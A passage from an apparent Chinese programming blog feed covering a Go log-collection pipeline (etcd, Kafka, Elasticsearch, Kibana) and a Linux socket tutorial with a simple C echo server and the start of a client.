class="keyword">create</span> <span class="keyword">table</span> tbl_log_info(</span><br><span class="line">log_id <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">app_id <span class="built_in">varchar</span>(<span class="number">1024</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">log_path <span class="built_in">varchar</span>(<span class="number">64</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">topic <span class="built_in">varchar</span>(<span class="number">1024</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">create_time <span class="built_in">TIMESTAMP</span> <span class="keyword">DEFAULT</span> <span class="keyword">CURRENT_TIMESTAMP</span>,</span><br><span class="line"><span class="keyword">status</span> <span class="built_in">tinyint</span> <span class="keyword">default</span> <span class="number">1</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 AUTO_INCREMENT=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>数据库创建成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span> show tables;</span><br><span class="line">+----------------------+</span><br><span class="line">| Tables_in_logcollect |</span><br><span class="line">+----------------------+</span><br><span class="line">| tbl_app_info         |</span><br><span class="line">| tbl_app_ip           |</span><br><span class="line">| tbl_log_info         |</span><br><span class="line">+----------------------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>在前端主页面，项目列表对应<code>tbl_app_info</code>这张表，日志列表对应<code>tbl_log_info</code>这张表。<code>tbl_app_ip</code>这张表用来保存项目所在的<code>ip</code>地址。</p><h4 id="etcd"><a href="#etcd" class="headerlink" title="etcd"></a>etcd</h4><p>当我们申请好项目之后，就可以针对该项目所产生的日志进行收集。对于所要收集的日志配置信息，可以采用etcd进行存储。</p><p>例如我们可以在日志申请页写入所要收集的项目信息，前提是项目的名字必须在项目列表中是存在的，否则日志申请就会失败。</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/2.png" alt="2"></p><p>etcd中获取key的值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % etcdctl get /backend/logagent/config/10.100.163.201</span><br><span class="line">/backend/logagent/config/10.100.163.201</span><br><span class="line">[&#123;"logpath":"/Users/caoyifan/test.log","topic":"kafka_test"&#125;]</span><br></pre></td></tr></table></figure><h4 id="logAgent"><a href="#logAgent" class="headerlink" title="logAgent"></a>logAgent</h4><p>logAgent项目树结构如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">logAgent</span><br><span class="line">├── conf</span><br><span class="line">│   └── logAgent.conf</span><br><span class="line">├── kafka</span><br><span class="line">│   └── kafka.go</span><br><span class="line">├── logs</span><br><span class="line">│   └── my.log</span><br><span class="line">├── main</span><br><span class="line">│   ├── config.go</span><br><span class="line">│   ├── etcd.go</span><br><span class="line">│   ├── ip.go</span><br><span class="line">│   ├── log.go</span><br><span class="line">│   ├── main.go</span><br><span class="line">│   └── server.go</span><br><span class="line">├── tailf</span><br><span class="line">│   └── tail.go</span><br><span class="line">└── tools</span><br><span class="line">    └── SetConf</span><br><span class="line">        └── main.go</span><br></pre></td></tr></table></figure><p>其中每个文件的具体作用如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">logagent.conf :配置文件</span><br><span class="line">kafka.go:对kafka的操作，包括初始化kafka连接，以及给kafka发送消息</span><br><span class="line">my.log:产生的日志文件</span><br><span class="line">config.go:用于初始化读取配置文件中的内容，这里的配置文件加载是通过之前自己实现的配置文件热加载包处理的</span><br><span class="line">etcd.go:对etcd的操作，包括初始化etcd和监听etcd</span><br><span class="line">ip.go:获取本机所有的网卡ip，连接etcd</span><br><span class="line">log.go:日志的处理与序列化</span><br><span class="line">main.go: 初始化入口文件,与执行server的入口函数</span><br><span class="line">server.go:主要是tail 的相关操作，用于去读日志文件并将内容放到channel中</span><br><span class="line">tail.go: 用于去读日志文件</span><br><span class="line">SetConf.main.go:将设置的配置信息导入到etcd中</span><br></pre></td></tr></table></figure><p>进入main文件夹中，执行<code>go build</code>命令，之后执行<code>./main</code>启动项目，项目启动日志输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2021/11/12 15:32:11.007 [D]  get config from etcd success, [&#123;/Users/caoyifan/test.log kafka_test&#125;]</span><br><span class="line">2021/11/12 15:41:14.985 [D]  导入日志成功&amp;&#123;debug /Users/caoyifan/go/src/Golang_logCollect/logAgent/logs/my.log 100 0.0.0.0:9092 [] 0.0.0.0:2379 /backend/logagent/config/&#125;</span><br><span class="line">2021/11/12 15:41:14.987 [D]  resp from etcd:[key:"/backend/logagent/config/10.100.163.201" create_revision:41 mod_revision:61 version:14 value:"[&#123;\"logpath\":\"/Users/caoyifan/test.log\",\"topic\":\"kafka_test\"&#125;]" ]</span><br><span class="line">2021/11/12 15:41:14.987 [D]  日志设置为[&#123;/Users/caoyifan/test.log kafka_test&#125;]</span><br><span class="line">2021/11/12 15:41:14.987 [D]  连接etcd成功</span><br><span class="line">2021/11/12 15:41:14.987 [D]  初始化etcd成功!</span><br><span class="line">2021/11/12 15:41:14.987 [D]  初始化tailf成功!</span><br><span class="line">2021/11/12 15:41:14.988 [D]  开始监控key: /backend/logagent/config/10.100.163.201</span><br><span class="line">2021/11/12 15:41:14.997 [D]  初始化Kafka producer成功,地址为: 0.0.0.0:9092</span><br><span class="line">2021/11/12 15:41:14.997 [D]  初始化Kafka成功!</span><br></pre></td></tr></table></figure><p>可以看到，项目启动之后首先会从etcd中去获取前端写入etcd中的日志收集配置信息，之后etcd会持续监控key的变化，一旦有新的日志配置加入etcd中，就会更新配置文件，随后启动kafka准备从日志文件中读取日志信息。</p><p>测试日志文件读取</p><p>在<code>/Users/caoyifan</code>目录下创建<code>test.log</code>文件并尝试写入一些信息。</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/3.png" alt="3"></p><p>发现kafka能够成功读取写入的文件信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2021/11/12 15:46:50.530 [D]  导入日志成功&amp;&#123;debug /Users/caoyifan/go/src/Golang_logCollect/logAgent/logs/my.log 100 0.0.0.0:9092 [] 0.0.0.0:2379 /backend/logagent/config/&#125;</span><br><span class="line">2021/11/12 15:46:50.533 [D]  resp from etcd:[key:"/backend/logagent/config/10.100.163.201" create_revision:41 mod_revision:61 version:14 value:"[&#123;\"logpath\":\"/Users/caoyifan/test.log\",\"topic\":\"kafka_test\"&#125;]" ]</span><br><span class="line">2021/11/12 15:46:50.533 [D]  日志设置为[&#123;/Users/caoyifan/test.log kafka_test&#125;]</span><br><span class="line">2021/11/12 15:46:50.533 [D]  连接etcd成功</span><br><span class="line">2021/11/12 15:46:50.533 [D]  初始化etcd成功!</span><br><span class="line">2021/11/12 15:46:50.533 [D]  初始化tailf成功!</span><br><span class="line">2021/11/12 15:46:50.533 [D]  开始监控key: /backend/logagent/config/10.100.163.201</span><br><span class="line">2021/11/12 15:46:50.536 [D]  初始化Kafka producer成功,地址为: 0.0.0.0:9092</span><br><span class="line">2021/11/12 15:46:50.536 [D]  初始化Kafka成功!</span><br><span class="line">2021/11/12 15:47:21.637 [D]  read success, pid:0, offset:0, topic:kafka_test</span><br><span class="line"></span><br><span class="line">2021/11/12 15:47:21.641 [D]  read success, pid:0, offset:1, topic:kafka_test</span><br><span class="line"></span><br><span class="line">2021/11/12 15:47:21.642 [D]  read success, pid:0, offset:2, topic:kafka_test</span><br></pre></td></tr></table></figure><h4 id="logTransfer"><a href="#logTransfer" class="headerlink" title="logTransfer"></a>logTransfer</h4><p>确保已经启动了<code>kafka</code>和<code>ElasticSearch</code>和<code>kibana</code></p><p>进入main文件夹下，执行<code>go build</code>，输出日志如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro main % ./main  </span><br><span class="line">2021/11/17 17:51:56.784 [D]  初始化配置成功</span><br></pre></td></tr></table></figure><p>这个时候我们查看一下etcd中的日志配置信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % etcdctl get /backend/logagent/config/10.100.163.201</span><br><span class="line">/backend/logagent/config/10.100.163.201</span><br><span class="line">[&#123;"logpath":"/Users/caoyifan/kafka.log","topic":"kafka_log"&#125;]</span><br></pre></td></tr></table></figure><p>接着我们尝试向<code>kafka.log</code>中写入一些测试信息</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/4.png" alt="4"></p><p>这个时候我们查看<code>logAgent</code>中的日志，发现消息已经成功写入了kafka中</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/5.png" alt="5"></p><p>再查看<code>logTransfer</code>中的日志，发现已经成功收集到日志信息</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/6.png" alt="6"></p><h4 id="Kibana可视化"><a href="#Kibana可视化" class="headerlink" title="Kibana可视化"></a>Kibana可视化</h4><p>这个时候我们已经成功收集到了kafka中的消息，并且已经将消息写入到了ElasticSearch中，接下来我们配置一下Kibana查看收集到的相关信息。</p><p>首先我们在Kibana中创建索引，索引名就是我们在etcd中获取到的topic名称。</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/7.png" alt="7"></p><p>通过postman，我们看到当前ElasticSearch中一共有三个索引，其中有一个就是我们创建好的<code>kafka_log</code>索引</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/8.png" alt="8"></p><p>最后我们在Kibana的Discover模块下，选择相应的索引，就可以看到索引下的相关数据。</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/9.png" alt="9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;该项目主要分为三个部分，web端负责对etcd的写入以及从mysql读写数据进行展示。logAgent负责日志的收集，主要是通过tail从e
      
    
    </summary>
    
    
      <category term="go" scheme="elssm.github.io/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>Linux网络编程</title>
    <link href="elssm.github.io/2021/11/02/Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <id>elssm.github.io/2021/11/02/Linux网络编程/</id>
    <published>2021-11-02T01:24:29.000Z</published>
    <updated>2021-11-17T09:33:10.387Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Socket编程"><a href="#Socket编程" class="headerlink" title="Socket编程"></a>Socket编程</h4><h5 id="套接字概念"><a href="#套接字概念" class="headerlink" title="套接字概念"></a>套接字概念</h5><p>在Linux环境下，Socket用于表示进程间网络通信的特殊文件类型。本质为内核借助缓冲区形成的伪文件。既然是文件，那么我们可以使用文件描述符引用套接字，与管道类似的，Linux系统将其封装成文件的目的是为了统一接口，使得读写套接字和读写文件的操作一致。区别是管道主要应用于本地进程间通信，而套接字多应用于网络进程间数据的传递。</p><p>在<code>TCP/IP</code>协议中，”IP地址+TCP或UDP端口号”唯一标识网络通讯中的一个进程，”IP地址+端口号”就对应一个<code>socket</code>。欲建立连接的两个进程各自有一个<code>socket</code>来标识，那么这两个<code>socket</code>组成的<code>socket pair</code>就唯一标识一个连接，因此可以用<code>Socket</code>来描述网络连接的一对一关系。</p><p>在网络通信中，套接字一定是成对出现的。一端的发送缓冲区对应对端的接受缓冲区。我们使用同一个文件描述符对应发送缓冲区和接收缓冲区。</p><h5 id="网络字节序"><a href="#网络字节序" class="headerlink" title="网络字节序"></a>网络字节序</h5><p>我们已经知道，内存中的多字节数据相对于内存地址有大端和小端之分，磁盘文件中的多字节数据相对于文件中的偏移地址也有大端小端之分，网络数据流同样有大端小端之分，那么如何定义网络数据流的地址呢。发送主机通常将发送缓冲区中的数据按内存地址从低到高的顺序发出。接收主机把从网络上接到的字节一次保存在接受缓冲区中，也是按内存地址从低到高的顺序保存，因此，网络数据流的地址应这样规定：先发出的数据是低地址，后发出的数据是高地址。</p><p><code>TCP/IP</code>协议规定，网络数据流应采用大端字节序，即低地址高字节，例如在<code>UDP</code>段格式中，地址<code>0-1</code>是16位的源端口号，如果这个端口号是<code>1000(0x3e8)</code>，则地址0是<code>0x03</code>，地址1时是<code>0xe8</code>，也就是先发<code>0x03</code>，再发<code>0xe8</code>，这16位在发送主机的缓冲区中也应该是低地址存<code>0x03</code>，高地址存<code>0xe8</code>，但是如果发送主机是小端字节序的，这16位被解释成<code>0xe803</code>，而不是1000。因此发送主机把1000填到发送缓冲区之前需要做字节序的转换。同样的，接收主机如果是小端字节序的，接到16位的源端口号也要做字节序的转换，如果主机是大端字节序的，发送和接收都不需要做转换。同理，32位的IP地址也要考虑网络字节序和主机字节序的问题。    </p><p>为了使网络程序具有可移植性，使同样的C代码在大端和小端计算机上编译后都能正常运行，可以调用以下库函数做网络字节序和主机字节序的转换。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">htonl</span><span class="params">(<span class="keyword">uint32_t</span> hostlong)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">htons</span><span class="params">(<span class="keyword">uint32_t</span> hostshort)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">ntohl</span><span class="params">(<span class="keyword">uint32_t</span> netlong)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">ntohs</span><span class="params">(<span class="keyword">uint32_t</span> netshort)</span></span>;</span><br></pre></td></tr></table></figure><p>其中h标识<code>host</code>，n表示<code>network</code>，l表示32位长整数，s表示16位短整数。如果主机时小端字节序，这些函数将参数做相应的大小端转换然后返回，如果主机时大端字节序，这些函数不做转换，将参数原封不动的返回。</p><h5 id="IP地址转换函数"><a href="#IP地址转换函数" class="headerlink" title="IP地址转换函数"></a>IP地址转换函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_pton</span><span class="params">(<span class="keyword">int</span> af,<span class="keyword">const</span> <span class="keyword">char</span> *src,<span class="keyword">void</span> *dst)</span></span>;</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">  af：AF_INET、AF_INET6</span><br><span class="line">  src：传入，IP地址（点分十进制）</span><br><span class="line">  dst：传出，转换后的网络字节序的IP地址</span><br><span class="line">返回</span><br><span class="line">  成功：<span class="number">1</span></span><br><span class="line">  异常：<span class="number">0</span> 说明src指向的不是一个有效的IP地址</span><br><span class="line">  失败：<span class="number">-1</span></span><br></pre></td></tr></table></figure><h4 id="网络套接字函数"><a href="#网络套接字函数" class="headerlink" title="网络套接字函数"></a>网络套接字函数</h4><h5 id="socket函数"><a href="#socket函数" class="headerlink" title="socket函数"></a>socket函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line">int socket(int domain,int type,int protocol) 创建一个套接字</span><br><span class="line">  </span><br><span class="line">domain：AF_INET、AF_INET6、AF_UNIX</span><br><span class="line">type：SOCK_STREAM、SOCK_DGRAM</span><br><span class="line">protocol：<span class="number">0</span></span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">  成功：新套接字所对应的文件描述符</span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="bind函数"><a href="#bind函数" class="headerlink" title="bind函数"></a>bind函数</h5><p>给socket绑定一个地质结构(IP+port)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">sockfd：socket函数返回值</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons(<span class="number">8888</span>)</span><br><span class="line">  addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">addr：(struct sockaddr *)&amp;addr</span><br><span class="line">addrlen：<span class="keyword">sizeof</span>(addr)地址结构的大小</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="listen函数"><a href="#listen函数" class="headerlink" title="listen函数"></a>listen函数</h5><p>设置同时与服务器建立连接的上限数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> backlog)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">sockfd：socket函数返回值</span><br><span class="line">backlog：上限数值，最大<span class="number">128</span></span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="accept函数"><a href="#accept函数" class="headerlink" title="accept函数"></a>accept函数</h5><p>阻塞等待客户端建立连接，成功的话，返回一个与客户端成功连接的socket文件描述符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd,struct socketaddr *addr,<span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">sockfd：socket函数返回值</span><br><span class="line">addr：传出参数，成功与服务器建立连接的那个客户端的地址结构(IP+port)</span><br><span class="line">  <span class="keyword">socklen_t</span> clit_addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">addrlen：传入传出。入：addr的大小。出：客户端addr实际大小</span><br><span class="line">  </span><br><span class="line">返回值</span><br><span class="line">  成功：能与服务器进行数据通信的socket对应的文件描述符</span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="connect函数"><a href="#connect函数" class="headerlink" title="connect函数"></a>connect函数</h5><p>使用现有的socket与服务器建立连接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">const</span> struct sockaddr *addr,<span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">sockfd：socket函数返回值</span><br><span class="line">addr：传入参数。服务器的地址结构</span><br><span class="line">addrlen：服务器的地址结构的大小</span><br><span class="line">  </span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="实现server端"><a href="#实现server端" class="headerlink" title="实现server端"></a>实现server端</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> lfd = <span class="number">0</span>,cfd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ],client_IP[<span class="number">1024</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>,<span class="title">clit_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clit_addr_len;</span><br><span class="line">serv_addr.sin_family = AF_INET;</span><br><span class="line">serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">lfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(lfd == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bind(lfd,(struct sockaddr *)&amp;serv_addr,<span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"></span><br><span class="line">listen(lfd,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">clit_addr_len = <span class="keyword">sizeof</span>(clit_addr);</span><br><span class="line">cfd = accept(lfd,(struct sockaddr *)&amp;clit_addr,&amp;clit_addr_len);</span><br><span class="line"><span class="keyword">if</span>(cfd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"accept error"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client ip:%s port:%d\n"</span>,inet_ntop(AF_INET,&amp;clit_addr.sin_addr.s_addr,client_IP,<span class="keyword">sizeof</span>(client_IP)),ntohs(clit_addr.sin_port));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">ret = read(cfd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;ret;i++)</span><br><span class="line">buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">write(cfd,buf,ret);</span><br><span class="line">&#125;</span><br><span class="line">close(lfd);</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="实现client端"><a href="#实现client端" class="headerlink" title="实现client端"></a>实现client端</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span 